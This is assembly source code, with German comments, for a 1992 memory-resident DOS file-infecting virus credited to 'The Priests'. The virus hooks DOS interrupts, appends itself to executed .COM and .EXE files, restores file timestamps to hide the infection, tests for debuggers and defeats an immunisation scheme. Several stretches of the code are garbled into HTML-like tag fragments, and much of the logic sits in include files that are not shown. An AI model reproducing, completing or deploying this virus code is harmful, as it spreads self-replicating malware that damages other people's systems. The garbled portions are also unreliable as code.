

            TITLE V5.ASM

;(c) 1992 by The Priests (DR.ET)

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ EQU-Anweisungen:                                                           ³
;³----------------------------------------------------------------------------³
;³ EQUs siehe Vx_EQU.INC, Werte sind assemblierungsabh„nig.                   ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

          INCLUDE V5_EQU.INC            ;EQU-Vereinbarungen
          INCLUDE V5_BUF.INC            ;Pufferdeklarationen
          INCLUDE V5_NON.INC            ;NON-Resident part of Vx
          INCLUDE V5_TSR.INC            ;TSR-part of Vx

ASSUME CS:CODE, DS:CODE, ES:CODE

CODE SEGMENT

ORG 100H

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ NON-Resident part:                                                         ³
;³----------------------------------------------------------------------------³
;³ MACROS siehe Vx_NON.INC.                                                   ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
START:    HOST VIRUS                    ;Sprung zu VIRUS

;ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
;º VIRUS:                                                                     º
;º============================================================================º
;º Nichtresidenter Teil des Virus.                                            º
;ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
VIRUS     PROC FAR                      ;Erste Adresse des Virus!

SET_IP:   MOV BP,FAKTOR                 ;IP herausfinden!
          PUSH DS                       ;<ds> sichern (und somit auch <es> !!!)

          TESTDEBUG                     ;Debuggertest

;------------------------------------------------------------------------------
; SEG-REGs + Flags setzen:
;------------------------------------------------------------------------------
          PUSH CS                       ;<ds> und <es> auf <cs> setzen:
          POP DS                        ;<-- (s.o.)="" push="" cs=""></--><-- (s.o.)="" pop="" es=""></--><-- (s.o.)="" cld="" ;aufsteigend="" (stringmanipulation)="" ;------------------------------------------------------------------------------="" resethost="" ;host="" reparieren="" verschieb="" ende="" ;virus="" verschieben?="" fehler="" --=""> ENDE
          SETINTS                       ;Interupts umbiegen

;------------------------------------------------------------------------------
; <es> und <ds> restaurieren:
;------------------------------------------------------------------------------
ENDE:     POP DS                        ;<ds> und <es> restaurieren
          PUSH DS                       ;<--- (s.o.)="" pop="" es=""></---><--- (s.o.)="" ;------------------------------------------------------------------------------="" ;="" virus="" beenden="" (.com="" oder="" .exe..?="" s.o...):="" ;------------------------------------------------------------------------------="" db="" 0eah="" ;direct="" intersegment="" jmp...="" host_ofs="" dw="" 0100h="" ;ofs-adr="" fr="" den="" rcksprung="" zum="" host="" host_seg="" dw="" ;seg-adr="" fr="" den="" rcksprung="" zum="" host="" ;------------------------------------------------------------------------------="" virus="" endp="" ;úääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääää¿="" ;³="" tsr-part:="" ³="" ;³----------------------------------------------------------------------------³="" ;³="" macros="" siehe="" vx_tsr.inc.="" ³="" ;àääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääù="" ;éíííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííí»="" ;º="" neu24:="" º="" ;º="===========================================================================º" ;º="" neuer="" int="" 24h-handler="" (critical="" error).="" º="" ;èíííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííí¼="" neu24="" proc="" far="" mov="" al,3="" ;aktuelle="" funktion="" abbrechen...="" iret="" ;zurck="" zur="" fehlerhaften="" funktion.="" neu24="" endp="" ;éíííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííí»="" ;º="" neu21:="" º="" ;º="===========================================================================º" ;º="" neuer="" int="" 21h-handler="" (dos-funktionen).="" º="" ;èíííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííí¼="" neu21="" proc="" far="" setaktiv="" end21="" ;schon="" aktiv?="" ja="" --=""> END21

          VERTEST END21                           ;Schon drin? JA --> END21
          TEST21 END21                            ;Nich gemeint --> END21

          PUSHALL                                 ;Register sichern

          SCANNAME END21POP                       ;Kein EXECutable --> END21POP
          JMP START_ME                            ;.EXE oder .COM --> START_ME

END21POP: POPALL                                  ;Register laden

END21:    CLRAKTIV                                ;INT 21H NICHT mehr aktiv!

;------------------------------------------------------------------------------
; Sprung zum orginal INT 21H Handler:
;------------------------------------------------------------------------------
          DB 0EAH                                 ;Direct Intersegment Jmp...
ALT21     DD ?                                    ;Rcksprung zum INT 21H

;==============================================================================
; Virus anh„ngen oder nicht:
;==============================================================================

START_ME: LIESINTS                                ;Vektoren lesen und PUSHEN!!!
          PUSHINTS                                ;Alte Vektoren neu setzen
          ATTRPUSH REST_INT                       ;PUSH!, FEHLER --> REST_INT

          FOPEN BREAK                             ;File-Open, FEHLER --> BREAK

          PUSH CS                                 ;Nebenbei...
          POP DS                                  ;...<ds> auf <cs> setzen

          TAILTEST CLOSE                          ;Infiziert/FEHLER --> CLOSE
          READHEAD F_CLOSE                        ;Ersten 18H BYTEs einlesen
          LAENGE F_CLOSE                          ;FL„nge, FEHLER --> CLOSE

;------------------------------------------------------------------------------
; Dateizeiger auf den Anfang des Hosts:
;------------------------------------------------------------------------------
          CALL SEEK_BEG                 ;Dateizeiger auf den Anfang der Datei
          JC F_CLOSE                    ;FEHLER --> N_CLOSE --> CLOSE
;------------------------------------------------------------------------------

          TIMEPUSH F_CLOSE                        ;ZEIT+DATUM auf den STACK

          SETHOST CLOSE                           ;Modify, FEHLER --> CLOSE,

          IMMUNTEST                               ;Wenn n”tig TNT entsch„rfen.
          FSPACE DI                               ;<di> s. SETHOST
          ZAEHL                                   ;Anzahl kopien z„hlen
          COPY                                    ;Virus hinten dranh„ngen

MODIFY:   TIMEPOP                                 ;Alte Zeit neu setzen
CLOSE:    FCLOSE                                  ;File schlieáen
BREAK:    ATTRPOP                                 ;Attribut restaurieren
REST_INT: POPINTS

;------------------------------------------------------------------------------
; INT beenden...
;------------------------------------------------------------------------------
          JMP END21POP                  ;INT Beenden --> NEU21END
;------------------------------------------------------------------------------

NEU21     ENDP

;ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
;º SEEK_BEG:                                                                  º
;º============================================================================º
;º Dateizeiger auf den Anfang der Datei setzen:                               º
;ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
SEEK_BEG  PROC NEAR

          MOV AX,4200H                  ;Dateizeiger bew., relativ zum Anfang
          XOR CX,CX                     ;HI-WORD des Offset
          XOR DX,DX                     ;LO-WORD des offset
          CALL GODOS                    ;Handle in <bx>

          RET                           ; --> HOME

SEEK_BEG  ENDP

;ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
;º GODOS:                                                                     º
;º============================================================================º
;º Direkter Aufruf von INT 21H                                                º
;ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
GODOS     PROC NEAR                     ;DOS-INT direkt aufrufen!!!

          PUSHF
          CALL DWORD PTR CS:[ALT21-FAKTOR]
          RET
                                        ;--> Is 17 BYTEs kleiner als die 
GODOS     ENDP                          ;Methode mit den Vektoren umbiegen..!

;ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
;º PUFFER-Deklarationen:                                                      º
;º============================================================================º
;º MACROS siehe Vx_BUF.INC.                                                   º
;ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
VIRBUF    PROC NEAR

          SCANBUF                       ;Scannernamen speichern
          INTERNBUF                     ;Interner Puffer

VIR_END   EQU $                         ;Ende des Virus

          EXTERNBUF                     ;Externer Puffer

VIRBUF    ENDP
;------------------------------------------------------------------------------

CODE      ENDS

          END START

</bx></di></cs></ds></---></es></ds></ds></es></--></cs></es></ds></es></ds>